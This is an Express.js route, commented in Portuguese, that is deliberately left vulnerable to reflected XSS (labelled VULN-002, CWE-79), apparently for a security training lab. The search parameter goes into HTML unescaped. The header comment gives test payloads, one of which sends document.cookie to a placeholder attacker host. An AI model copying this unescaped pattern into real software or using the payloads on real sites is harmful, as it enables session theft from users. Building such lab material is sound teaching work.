// =====================================================================
// VULN-002  XSS REFLECTED
// CWE-79  |  OWASP A03:2021  |  CVSS 6.1 (Medium)
// ---------------------------------------------------------------------
// Retorna HTML contendo o parâmetro `q` sem qualquer encoding.
// Payload de teste:
//   /api/search?q=<script>alert(document.cookie)</script>
//   /api/search?q=<img src=x onerror=fetch('//attacker/?c='+document.cookie)>
// Também seta Content-Type text/html para garantir execução no browser.
// =====================================================================
const express = require('express');
const router = express.Router();

router.get('/search', (req, res) => {
  const q = req.query.q || '';
  // Sem escape, sem sanitização, sem CSP. HTML cru injetado.
  const html = `
    <!doctype html>
    <html><head><title>VulnHub Search</title></head>
    <body>
      <h1>Resultados para: ${q}</h1>
      <p>Nenhum produto encontrado, mas seu payload foi executado com sucesso.</p>
      <form method="GET" action="/api/search">
        <input name="q" value="${q}" />
        <button>Buscar</button>
      </form>
    </body></html>`;
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(html);
});

module.exports = router;
